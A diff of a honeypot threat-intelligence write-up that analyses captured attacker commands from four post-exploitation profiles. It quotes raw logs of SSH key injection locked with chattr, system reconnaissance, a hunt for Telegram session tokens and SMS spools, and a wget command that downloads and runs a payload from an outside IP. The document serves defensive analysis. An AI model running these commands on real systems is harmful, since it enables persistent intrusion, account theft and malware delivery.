@@ -52,38 +52,55 @@ Following a successful brute-force attack (`root/root`) by a South Korean IP add
 
 ---
 
-## 🔬 Advanced Forensics: Establishing Persistence & Defense Evasion
-In addition to analyzing initial access vectors, the honeynet captured advanced post-exploitation playbooks. One notable capture involved an automated threat actor attempting to establish a persistent, unremovable backdoor using Linux file attributes and encoded Command & Control (C2) signaling.
+## 🔬 Advanced Forensics: Multi-Actor Post-Exploitation Analysis
+Extended monitoring of the honeynet's `input` logs revealed that the infrastructure was targeted by multiple distinct threat actors, each with specialized post-exploitation playbooks. Below is a behavioral analysis of four unique attacker profiles captured in the environment.
 
-Raw Log Capture:
+### 1. The Persistent Backdoor Installer (Defense Evasion)
+This threat actor attempted to establish a persistent, unremovable backdoor using Linux file attributes and encoded Command & Control (C2) signaling.
 
-Bash
-chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL...[truncated]... rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
-Forensic Breakdown of the Attack Chain
-1. Pre-Execution Cleanup
-Command: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh
+**Raw Log Capture:**
+`chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3...[truncated]" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"`
 
-Analysis: The attacker first executes a cleanup script to potentially kill competing malware (like other crypto-miners) and then immediately deletes the script (rm -rf) to minimize their forensic footprint on the disk.
+**Forensic Breakdown:**
+* **Pre-Execution Cleanup:** The attacker executes and deletes a cleanup script (`rm -rf clean.sh`) to kill competing malware and minimize their disk footprint.
+* **Environment Preparation:** Crucially, it runs `chattr -ia` on the `authorized_keys` file to strip any existing "immutable" protections set by system administrators before writing to it.
+* **Key Injection & Evasion:** After injecting their RSA key, the attacker uses `chattr +ai ~/.ssh/authorized_keys` to make the file **immutable** and **append-only**. This prevents even the `root` user from easily deleting the backdoor.
+* **C2 Signaling:** The execution concludes by echoing a hex-encoded string. When decoded, this translates to `auth_ok\n`, acting as a beacon back to the C2 server confirming successful backdoor installation.
 
-2. Environment Preparation
-Command: mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys;
+### 2. The Automated Surveyor (Data Brokering)
+This bot’s objective was to aggressively profile the system to evaluate its worth, likely to sell the access to a specialized ransomware or cryptomining group.
 
-Analysis: The bot creates the SSH directory. Crucially, it runs chattr -ia on the authorized_keys file before attempting to write to it. This strips any existing "immutable" or "append-only" protections that a system administrator might have previously set.
+**Raw Log Capture:**
+`hostname; echo '___BSEP_A1B2C3___'; uname -a; echo '___BSEP_A1B2C3___'; whoami; echo '___BSEP_A1B2C3___'; netstat -tulpn | head -10; echo '___BSEP_A1B2C3___'; cat /etc/os-release`
 
-3. Key Injection (Persistence)
-Command: echo "ssh-rsa AAAAB3N..." > ~/.ssh/authorized_keys
+**Forensic Breakdown:**
+* **System Profiling:** The script executes a rapid succession of commands (`whoami`, `netstat`, `cat /etc/os-release`) to map open ports, user privileges, and the specific OS version.
+* **Programmatic Parsing:** The attacker echoes the unique string `___BSEP_A1B2C3___` between every command. This acts as a delimiter, allowing the attacker's C2 server to automatically parse the massive wall of returned text into a clean database.
 
-Analysis: The attacker injects their own public RSA key into the system's authorized keys. This grants them permanent, passwordless SSH access to the compromised machine, ensuring they retain control even if the original compromised password (root/root) is changed.
+### 3. The Info Stealer & Resource Hijacker
+This highly specialized, financially motivated threat actor hunted for specific applications and competing malware.
 
-4. Defense Evasion
-Command: chattr +ai ~/.ssh/authorized_keys
+**Raw Log Capture:**
+`ps -ef | grep '[Mm]iner'`
+`ls -la ~/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /var/spool/sms/*`
 
-Analysis: Once the malicious key is injected, the attacker uses the chattr utility to add the +a (append-only) and +i (immutable) attributes to the file. This is a classic defense evasion technique; it prevents standard users—and even the root user—from easily deleting or modifying the file without first knowing to remove the attribute.
+**Forensic Breakdown:**
+* **Resource Hijacking:** The actor runs `grep '[Mm]iner'` to check if another hacker has already installed a crypto-miner so they can kill the process and steal the CPU resources for themselves.
+* **Identity Theft & MFA Bypass:** The script actively hunts for Telegram session tokens (`tdata`). If stolen, the attacker can clone the user's Telegram account, bypassing 2FA. Additionally, it sweeps for GSM cellular modems (`/dev/ttyGSM*`) and SMS spools, which are targeted to intercept SMS-based 2FA codes.
 
-5. C2 Signaling & Obfuscation
-Command: echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+### 4. The IoT & Enterprise Router Exploiter
+This botnet blindly executes commands designed to exploit poorly secured enterprise hardware, unaware it is trapped in a Linux simulation.
 
-Analysis: The execution concludes by echoing a hex-encoded string. When decoded, this translates to auth_ok\n. This acts as a beacon back to the attacker's Command and Control server, confirming that the backdoor was successfully installed and the node is ready to receive further instructions.
+**Raw Log Capture:**
+`enable`
+`system`
+`shell`
+`sh`
+`wget http://202.155.10.112/shr; chmod 777 shr; ./shr ssh`
 
-Threat Intelligence Takeaway
-This sequence perfectly illustrates the necessity of behavioral monitoring and File Integrity Monitoring (FIM). Relying solely on password rotation is insufficient if an attacker has already manipulated kernel-level file attributes to guarantee their own persistent access.
+**Forensic Breakdown:**
+* **Hardware Breakout:** The sequence `enable -> system -> shell` is the exact command path required to break out of the restricted command-line interface (CLI) of specific enterprise routers (e.g., Cisco, MikroTik) and drop into the underlying root shell.
+* **Malware Delivery:** Once the shell is assumed active, the bot uses `wget` to pull down an executable payload, modifies the permissions, and attempts to run it.
+
+### Threat Intelligence Takeaway
+This multi-actor analysis illustrates that relying solely on strong passwords is insufficient. Modern cloud assets face simultaneous threats from cryptominers, data brokers, and IoT botnets. Effective defense requires Defense-in-Depth, including strict network segmentation, File Integrity Monitoring (FIM), and behavioral alerting.
